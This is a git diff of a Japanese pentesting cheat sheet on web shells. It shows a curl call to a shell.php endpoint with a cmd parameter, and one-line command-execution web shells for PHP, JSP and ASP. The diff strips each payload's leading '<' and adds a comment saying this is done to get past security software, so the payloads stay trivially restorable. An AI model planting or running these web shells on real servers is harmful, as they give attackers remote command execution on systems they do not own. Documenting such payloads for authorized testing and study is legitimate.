@@ -22,18 +22,19 @@ curl http://target:port/shell.php?cmd=<command>
 Pythonを使って擬似的に対話形式にすることもできる。
 
 ## コード
+※セキュリティソフト対策で最初の`<`を除く
 
 - PHP
 ```php
-<?php system($_REQUEST["cmd"]); ?>
+?php system($_REQUEST["cmd"]); ?>
 ```
 - JavaServer Pages
 ```jsp
-<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
 - Active Server Pages
 ```asp
-<% eval request("cmd") %>
+% eval request("cmd") %>
 ```
 
 
